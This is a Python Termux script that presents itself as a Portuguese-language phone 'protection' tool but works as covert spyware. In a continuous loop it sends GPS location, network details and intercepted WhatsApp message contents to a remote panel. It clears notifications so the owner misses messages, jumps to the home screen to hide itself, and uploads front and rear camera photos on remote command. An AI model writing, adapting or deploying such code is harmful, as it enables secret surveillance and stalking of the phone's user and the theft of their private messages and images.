import time
import subprocess
import json
import requests
import os
import uuid
import base64
from datetime import datetime

URL_SERVIDOR = "https://nexos-panel.onrender.com/update"
URL_UPLOAD_FOTO = "https://nexos-panel.onrender.com/api/upload_camera"
URL_PING = "https://nexos-panel.onrender.com/"
ARQUIVO_ID = os.path.expanduser("~/.nexos_device_id")

def run(cmd, timeout=4):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip()
    except:
        return ""

def obter_id():
    if os.path.exists(ARQUIVO_ID):
        with open(ARQUIVO_ID) as f: return f.read().strip()
    novo = f"NX-{str(uuid.uuid4())[:6].upper()}"
    with open(ARQUIVO_ID, "w") as f: f.write(novo)
    return novo

DEVICE_ID = obter_id()

print("\n" + "="*45)
print("🛡️  NEXOS - PROTECAO CELULAR")
print("="*45)
print(f"🔑 ID: {DEVICE_ID}")
print(f"🔗 Site: https://nexos-panel.onrender.com")
print("="*45)

run("am start -a android.intent.action.MAIN -c android.intent.category.HOME", timeout=3)
run("termux-notification-remove --all", timeout=2)

ultima_lat = -16.6869
ultima_lon = -49.2648
gps_ok = False
inicio = datetime.now()
ultimo_ping = 0
ultimo_whatsapp = 0
historico_msg = {}
msg_processadas = set()

def obter_rede():
    w = run("termux-wifi-connectioninfo")
    if w:
        try:
            i = json.loads(w)
            s = i.get("ssid","")
            if s and s != "<unknown ssid>": return f"WiFi: {s}"
        except: pass
    return "Dados Moveis"

def obter_gps():
    global ultima_lat, ultima_lon, gps_ok
    out = run("termux-location -p gps -r once", timeout=5)
    if out:
        try:
            d = json.loads(out)
            lat = d.get("latitude")
            lon = d.get("longitude")
            if lat and lon and float(lat) != 0 and float(lon) != 0:
                ultima_lat = float(lat)
                ultima_lon = float(lon)
                gps_ok = True
                return
        except: pass
    gps_ok = False

def obter_whatsapp():
    global ultimo_whatsapp, historico_msg, msg_processadas
    agora = time.time()
    if agora - ultimo_whatsapp < 10:
        return list(historico_msg.values())
    notif = run("termux-notification-list", timeout=4)
    if notif:
        try:
            dados = json.loads(notif)
            novas = False
            for n in dados:
                pkg = n.get("packageName", "")
                if "whatsapp" in pkg.lower():
                    pessoa = n.get("title", "WhatsApp")[:30]
                    texto = n.get("content", "")
                    msg_id = n.get("key", "") or f"{pessoa}_{texto[:50]}_{n.get('when','')}"
                    if msg_id in msg_processadas: continue
                    msg_processadas.add(msg_id)
                    novas = True
                    if len(msg_processadas) > 500: msg_processadas.clear()
                    
                    if pessoa not in historico_msg:
                        historico_msg[pessoa] = {"pessoa": pessoa, "mensagens": [], "ultima_msg": "", "total": 0, "midia": False}
                    if not historico_msg[pessoa]["mensagens"] or historico_msg[pessoa]["mensagens"][-1]["texto"] != texto[:150]:
                        historico_msg[pessoa]["mensagens"].append({"texto": texto[:150] if texto else "(sem texto)", "midia": False, "hora": datetime.now().strftime("%H:%M"), "tipo": "recebida"})
                        if len(historico_msg[pessoa]["mensagens"]) > 30: historico_msg[pessoa]["mensagens"] = historico_msg[pessoa]["mensagens"][-30:]
                        historico_msg[pessoa]["ultima_msg"] = texto[:80]
                        historico_msg[pessoa]["total"] = len(historico_msg[pessoa]["mensagens"])
            
            if novas: run("termux-notification-remove --all", timeout=2)
            ultimo_whatsapp = agora
        except: pass
    return list(historico_msg.values())

def executar_comando(acao):
    if acao == "vibrar": run("termux-vibrate -d 1000", timeout=3)
    elif acao == "som": run("am start -a android.intent.action.VIEW -d file:///system/media/audio/ringtones/Andromeda.ogg -t audio/*", timeout=3)
    elif acao == "lanterna": run("termux-torch on", timeout=3); time.sleep(2); run("termux-torch off", timeout=3)

def enviar_dados(payload):
    try:
        r = requests.post(URL_SERVIDOR, json=payload, timeout=5)
        if r.status_code == 200: return r.json()
    except: pass
    return None

def capturar_foto(num):
    arq = os.path.expanduser(f"~/nexos_foto.jpg")
    if os.path.exists(arq): os.remove(arq)
    try:
        subprocess.run(f"termux-camera-photo -c {num} {arq}", shell=True, timeout=5)
        time.sleep(1)
        if os.path.exists(arq) and os.path.getsize(arq) > 100:
            with open(arq, "rb") as f:
                b64 = base64.b64encode(f.read()).decode('utf-8')
            os.remove(arq)
            return b64
    except: pass
    if os.path.exists(arq): os.remove(arq)
    return None

def enviar_foto(tipo, b64):
    if not b64: return False
    try:
        r = requests.post(URL_UPLOAD_FOTO, json={"device_id": DEVICE_ID, "tipo": tipo, "photo": b64}, timeout=15)
        return r.status_code == 200
    except: return False

print("🛰️  Protecao ativa\n")

while True:
    t0 = time.time()
    
    if time.time() - ultimo_ping > 240:
        try: requests.get(URL_PING, timeout=10)
        except: pass
        ultimo_ping = time.time()
    
    bat = "N/A"
    out = run("termux-battery-status")
    if out:
        try: bat = str(json.loads(out).get("percentage", "N/A"))
        except: pass
    
    obter_gps()
    rede = obter_rede()
    msgs_whats = obter_whatsapp()
    
    payload = {
        "device_id": DEVICE_ID, "battery": bat,
        "uptime": str(datetime.now() - inicio).split('.')[0],
        "lat": ultima_lat, "lon": ultima_lon,
        "network": rede, "whatsapp": msgs_whats
    }
    
    resp = enviar_dados(payload)
    dt = time.time() - t0
    icone = "📍" if gps_ok else "📡"
    
    if resp and resp.get("status") == "success":
        cmd_cam = resp.get("comando_cam", "wait")
        cmd_remoto = resp.get("comando_remoto", "none")
        
        print(f"\r{icone} {datetime.now().strftime('%H:%M:%S')} | Bat:{bat}% | {rede} | {dt:.1f}s   ", end="", flush=True)
        
        if cmd_remoto != "none": executar_comando(cmd_remoto)
        
        if cmd_cam == "take_dual":
            print("\n📸 Capturando...")
            b64_tras = capturar_foto(0)
            if b64_tras:
                print("   📤 Traseira..." + ("✅" if enviar_foto("back", b64_tras) else "❌"))
            time.sleep(0.3)
            b64_front = capturar_foto(1)
            if b64_front:
                print("   📤 Frontal..." + ("✅" if enviar_foto("front", b64_front) else "❌"))
    
    time.sleep(2.0)
